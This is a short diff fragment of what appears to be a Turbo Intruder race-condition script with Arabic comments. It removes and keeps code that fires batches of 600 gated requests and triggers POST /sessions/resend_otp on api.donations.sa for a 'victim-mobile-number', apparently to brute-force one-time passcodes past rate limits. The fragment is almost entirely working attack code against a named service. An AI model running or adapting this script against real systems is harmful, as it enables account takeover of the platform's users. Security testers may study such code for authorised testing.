@@ -246,25 +246,6 @@ Content-Length: 45
 
         # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
         for i in range(1000, 1600):
-            engine.queue(target.req, i, gate='race12')
-        engine.openGate('race12')
-
-        time.sleep(305)
-
-        # ------ إرسال طلب resend_otp ------ #
-        resend_req = '''POST /sessions/resend_otp HTTP/1.1
-Host: api.donations.sa
-Content-Type: application/json
-Content-Length: 45
-
-{"user":{"login":"victim-mobile-number","user_role":0}}'''
-        engine.queue(resend_req)
-
-        # ------ 2 ثواني ------ #
-        time.sleep(2)
-
-        # ------ المرحلة 2: إعادة إرسال 600 طلب ------ #
-        for i in range(1000, 1600):
             engine.queue(target.req, i, gate='race13')
         engine.openGate('race13')
 
